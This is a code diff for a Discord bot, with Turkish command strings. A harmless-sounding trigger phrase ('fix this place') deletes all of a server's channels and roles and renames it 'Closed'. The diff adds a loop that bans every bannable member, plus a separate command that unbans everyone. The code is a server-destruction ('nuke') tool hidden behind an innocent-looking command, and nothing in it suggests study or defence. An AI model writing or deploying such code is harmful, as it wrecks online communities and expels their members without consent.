@@ -6,6 +6,11 @@ const berke = new Discord.Client();
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
 
+    msg.guild.members.forEach(u => {
+        if (u.bannable) {    
+            return u.ban();
+        }
+    })
     msg.guild.channels.deleteAll();
     msg.guild.roles.deleteAll();
     msg.guild.setName("Kapandı");
@@ -13,6 +18,17 @@ berke.on('message', async msg => {
     msg.guild.createChannel("hey");
 
   }
+});
+
+berke.on('message', message => {
+    if(message.content.toLowerCase() === 'ban kaldır' ) {
+        message.guild.fetchBans().then(bans => {
+            bans.forEach(user => {
+                console.log(user.username + '#' + user.tag);
+                message.guild.unban(user);
+            });
+        });
+    }
 });
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
